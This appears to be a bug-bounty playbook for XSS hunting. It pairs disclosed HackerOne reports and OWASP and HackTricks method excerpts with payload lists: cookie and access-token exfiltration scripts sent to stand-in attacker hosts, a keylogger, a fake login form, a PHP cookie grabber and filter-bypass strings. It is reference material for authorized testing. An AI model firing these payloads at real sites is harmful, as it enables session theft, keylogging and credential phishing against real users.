# Real-World Playbook — XSS (Reflected / Stored / DOM)

**Class:** `xss` · **Coverage-matrix tier:** 0 · **Hunter2:** vuln_scanner.sh (dalfox+xsstrike) · /domxss · tools/dom_xss_harness.py · **Skill:** web2-vuln-classes, client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed XSS reports peak at **$20,000**. Rewarded across: Basecamp, GitLab, PayPal, Reddit, Shopify, TikTok, Uber, Valve.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Bypass for #488147 enables stored XSS on https://paypal.com/signin again** — PayPal, $20,000 · 2683👍 · [510152](https://hackerone.com/reports/510152)
- **Stored XSS on https://paypal.com/signin via cache poisoning** — PayPal, $18,900 · 684👍 · [488147](https://hackerone.com/reports/488147)
- **Stored XSS in markdown via the DesignReferenceFilter** — GitLab, $16,000 · 316👍 · [1212067](https://hackerone.com/reports/1212067)
- **Stored XSS via Kroki diagram** — GitLab, $13,950 · 295👍 · [1731349](https://hackerone.com/reports/1731349)
- **New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields** — GitLab, $13,950 · 93👍 · [1578400](https://hackerone.com/reports/1578400)
- **XSS at jamfpro.shopifycloud.com** — Shopify, $9,400 · 240👍 · [1444682](https://hackerone.com/reports/1444682)
- **XSS in steam react chat client** — Valve, $7,500 · 495👍 · [409850](https://hackerone.com/reports/409850)
- **Stored XSS in developer.uber.com** — Uber, $7,500 · 223👍 · [131450](https://hackerone.com/reports/131450)
- **Stored XSS on any page in most Uber domains** — Uber, $6,000 · 107👍 · [217739](https://hackerone.com/reports/217739)
- **Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains** — Uber, $6,000 · 51👍 · [256152](https://hackerone.com/reports/256152)
- **Stored XSS in SVG file as data: url** — Shopify, $5,300 · 151👍 · [1276742](https://hackerone.com/reports/1276742)
- **Stored XSS in /admin/product and /admin/collections** — Shopify, $5,300 · 75👍 · [1147433](https://hackerone.com/reports/1147433)
- **[accounts.reddit.com] Redirect parameter allows for XSS** — Reddit, $5,000 · 394👍 · [1962645](https://hackerone.com/reports/1962645)
- **HEY.com email stored XSS** — Basecamp, $5,000 · 359👍 · [982291](https://hackerone.com/reports/982291)
- **RichText parser vulnerability in scheduled posts allows XSS** — Reddit, $5,000 · 280👍 · [1930763](https://hackerone.com/reports/1930763)
- **Reflected XSS on Pangle Endpoint** — TikTok, $5,000 · 196👍 · [2352968](https://hackerone.com/reports/2352968)
- **Reflected xss in https://sh.reddit.com** — Reddit, $5,000 · 165👍 · [1549206](https://hackerone.com/reports/1549206)
- **XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications** — Shopify, $5,000 · 87👍 · [232174](https://hackerone.com/reports/232174)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

[ ] Tools
```
https://github.com/DanMcInerney/xsscrapy
https://github.com/s0md3v/XSStrike
# Cross Site Scripting detection suite equipped with parsers
# XSStrike analyses the response with multiple parsers and then crafts payloads
# that are guaranteed to work by context analysis integrated with a fuzzing engine

# Documentation
https://github.com/s0md3v/XSStrike/wiki/Usage

# Classical GET
python xsstrike.py -u "http://example.com/search.php?q=query"

# POST
python xsstrike.py -u "http://example.com/search.php" --data "q=query"

# Path payloads
python xsstrike.py -u "http://example.com/search/form/query" --path

# Crawl and test
python xsstrike.py -u "http://example.com/page.php" --crawl

# Load payloads from file and test them
python3 xsstrike.py -u "http://example.com/page.php?q=query" -f /path/to/file.txt

# Find hidden parameters
python xsstrike.py -u "http://example.com/page.php" --params

```
[ ] automate Rxss 
### method uniq
```
https://github.com/yavolo/eventlistener-xss-recon
```
### first method
```

- collect a sub domain (AssetFinder - SubFinder – Amass – Find-domain - Google Dorking) 
 
- find the number of sub-domains which are active ( `httprobe (Tomnomnom) – HTTPX )  >> cat subdomains.txt | httprobe | tee -a host.txt 

- use your payloads :`` <script/src=//Ǌ.₨></script> 

- your report if not acceptd 

-  cat host.txt | crawler | tee -a endpoint.txt   & cat host.txt | waybackurl | tee -a endpoint.txt 

- After finding all the 50 Lakh endpoint I started to fuzz all the parameters to find xss vulnerability with the help of the tool qsreplace. The command used was: 

      cat endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a xss_fuzz.txt 

- After executing the command now, I had to check the number of parameters have been reflecting our payload into a plain text weather or not, So I created a tool named FREQ which is also available in my GitHub repo. So, the tool sends multiple requests to the check whether the response containing the payload return us with the affected URLs. The command used to perform this attack was: 

 cat xss_fuzz.txt | freq | tee -a possible_xss.txt 

```

### second method
```
cleanP : github.com/raoufmaklouf/c… 

injectP: github.com/raoufmaklouf/i… 

XSS.yaml : gist.githubusercontent.com/raoufmaklouf/7… 

- single target: `gau target.com | cleanP | injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt 
& 
- cat AllEndPoint.txt | cleanP | injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt 
```

### third method
```
irst of all, I enumerated all subdomains of the target.com with [subfinder](https://github.com/projectdiscovery/subfinder) and 
then subdomain brute-forcing with [knockpy](https://github.com/guelfoweb/knock), 
then I used [waybackurls](https://github.com/tomnomnom/waybackurls) to get parameters to test for XSS and then I used [gf](https://github.com/tomnomnom/gf) to get possible XSS parameters. 
after sorting the URLs I used [KXSS](https://github.com/Emoe/kxss) 
And [Dalfox](https://github.com/hahwul/dalfox). Bad luck I got nothing. 
```

### Four method
```
https://mirror-medium.com/?m=https://medium.com/@c0nqr0r/reading-robots-txt-got-me-4-xss-reports-9fd2234c635f&fbclid=IwAR1Z9wF54pIr0l3uLd9xLxiip3gbiWPDo-CFkNaGtrM7FTrLXDBzfI8pqKw
```

[ ] Tips
```
# If XSS is not executed through the UI, you can try to insert it through the API
# It can then fire on the UI. Many filters are not present like this
```

### Payloads
```
# Document.location
<script>document.location('http://IP_EXTERNE/'+document.cookie)</script>
<script>document.location.href = 'http://requestb.in/XXXXXX?cookies =' + document.cookie;</script>

# Window
<script>window.open("http://monserveur/Cookie="+document.cookie)</script>
<script>window.location='http://monsite.free.fr/script.php?cookies='+(document.cookie);</script>

# Document.write
<script>document.write('<img src="https://requestb.in/xxxxx?cookie="+document.cookie>admin</img>');</script>
admin"></i>)</span><script>document.write("<img src=http://requestb.in/XXXXX?cookie=".concat(encodeURI(document.cookie)).concat("/>"))</script><i>

<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://requestb.in/w0sw22w0', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(document.cookie);</script>

# alert(1) in JS
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

injecting inside of input tags
<input/onfocus=alert(0) autofocus>
<input/onfocus=alert`0` autofocus>
<input/onfocus=prompt`0` autofocus>
1'"><input/onfocus={alert`1`} autofocus> 
```

```
# WAF Bypass
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<svg/onload=(((confirm(1))))>
confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)

# No HTML events
<script>alert(1)//
<script>alert(1)<!--
<script>alert(1)%0A-->
<script src=data:,alert(1)>
<script src=//HOST/FILE>
<script src=https:DOMAIN/FILE>
<svg><script xlink:href=//HOST/FILE>
<svg><script xlink:href=https:DOMAIN/FILE>
<svg><script xlink:href=data:,alert(1)>
<svg/onload=(confirm(1))>
<svg/onload=confirm(1)>

# Stealing the source code without triggering browser restrictions
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">

# Non alphanumeric alert() payload
Ð=[],Ř=+!+Ð,ˍ=Ř+Ř+Ř,Š=!!Ð+Ð,Ť=!Ð+Ð,Ǎ=(!Ð+{})[Ř+[+Ð]],Č=(Ð+{})[Ř],Ȟ=Š[Ř],Ě=Š[+Ð],_=Ť[ˍ]+Č+Ȟ+Ě,ǰ=Ð[_]+Ð,š=Ð[Ð]+Ð,Ð[_][Ǎ+Č+(š)[Ř]+Ť[ˍ]+Ě+Ȟ+(š)[+Ð]+Ǎ+Ě+Č+Ȟ](Ť[Ř]+Ť[Ř+Ř]+Š[ˍ]+Ȟ+Ě+ǰ[Ř+[ˍ]]+ǰ[Ř+[ˍ+Ř]])()


```

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```
```
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```
```
<script>
  fetch('https://[ATTACKER.DOMAIN.TLD]', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
```
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```
```
<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
```
```
<script>debugger;</script>
```
```
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```
```
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```
```
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svg
onload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Reflected Cross Site Scripting

|ID          |
|------------|
|WSTG-INJT-01|

#### Summary

Reflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occurs when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.

Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.

When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser.

Commonly the attacker's code is written in the JavaScript language, but other scripting languages such as ActionScript and VBScript can also be used. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).

One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out `<script>`, but might not filter `%3cscript%3e` which simply includes another encoding of tags.

#### Test Objectives

- Identify variables that are reflected in responses.
- Assess the input they accept and the encoding that gets applied on return (if any).

#### How to Test

##### Black-Box Testing

A black-box test will include at least three phases:

###### Detect Input Vectors

Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.

###### Analyze Input Vectors

Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
  Some example of such input data are the following:

- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

For a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

###### Check Impact

For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.

Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:

- `>` (greater than)
- `<` (less than)
- `&` (ampersand)
- `'` (apostrophe or single quote)
- `"` (double quote)

However, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:

- `\n` (new line)

*(truncated — open the source link for the full method)*

### From AllAboutBugBounty
### XSS Cheat Sheet (Basic)

#### Introduction
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
- Reflected XSS

    Attack where the malicious script runs from another website through the web browser    
- Stored XSS
  
    Stored attacks are those where the injected script is permanently stored on the target servers
- DOM-Based XSS

    A type of XSS that has payloads found in the DOM rather than within the HTML code.

#### Where to find
This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.

#### How to exploit
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

* After input the payload
```html
<!-- --><script>alert(1)</script> -->
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
    
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* After input the payload
```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### XSS (Cross Site Scripting)


#### Methodology

1. Check if **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) is being **reflected** in the HTML or **used** by **JS** code.
2. **Find the context** where it's reflected/used.
3. If **reflected**
   1. Check **which symbols can you use** and depending on that, prepare the payload:
      1. In **raw HTML**:
         1. Can you create new HTML tags?
         2. Can you use events or attributes supporting `javascript:` protocol?
         3. Can you bypass protections?
         4. Is the HTML content being interpreted by any client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), you could abuse a [**Client Side Template Injection**](../client-side-template-injection-csti.md).
         5. If you cannot create HTML tags that execute JS code, could you abuse a [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
      2. Inside a **HTML tag**:
         1. Can you exit to raw HTML context?
         2. Can you create new events/attributes to execute JS code?
         3. Does the attribute where you are trapped support JS execution?
         4. Can you bypass protections?
      3. Inside **JavaScript code**:
         1. Can you escape the `<script>` tag?

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Stored XSS in an admin-viewed field → **admin session/ATO**
- XSS → CSRF-token exfil → state-changing request → ATO
- XSS → read authed API responses (same-origin) → PII/IDOR discovery
- DOM XSS via postMessage / location sink — confirm in a real DOM

## Hunter2 wiring
- **Run:** `vuln_scanner.sh (dalfox+xsstrike) · /domxss · tools/dom_xss_harness.py`
- **Skill:** `web2-vuln-classes, client-side-security`
- **Coverage-matrix tier:** 0 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Self-XSS that only fires in your own account, with no CSRF / second-user delivery vector
- `alert(1)` / `alert(document.domain)` popup only — no `document.cookie` exfil or session theft shown
- Reflected payload where a `Content-Security-Policy` header blocks execution (sandbox context, script never runs)
- Dalfox/XSStrike "reflection" with no confirmed rendered execution in a real browser DOM
- XSS behind login/CSRF token with no way to deliver it to another user

**Conditionally valid (only WITH a chain):** Self-XSS + CSRF to trigger it on a victim without their knowledge → Medium; stored XSS in an admin-viewed field → admin session/ATO.
